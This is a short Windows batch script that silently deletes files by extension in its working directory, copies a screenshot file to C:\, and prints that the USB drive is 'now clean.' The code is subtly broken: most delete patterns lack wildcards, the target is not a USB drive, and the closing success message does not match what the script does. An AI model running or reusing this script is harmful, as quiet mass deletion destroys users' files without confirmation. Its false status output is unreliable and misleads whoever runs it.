@echo off
del /q .bat
del /q .ps1
del /q .exe
del /q .png
del /q .wav
del /q .txt
del /q .dll
del /q .log
del /q .tmp
del /q .ini
del /q *.cfg

echo [+] Replacing USB contents with a .png file...
copy /y C:\screen_capture.png C:\

echo [+] All files deleted and replaced with .png. USB is now clean.
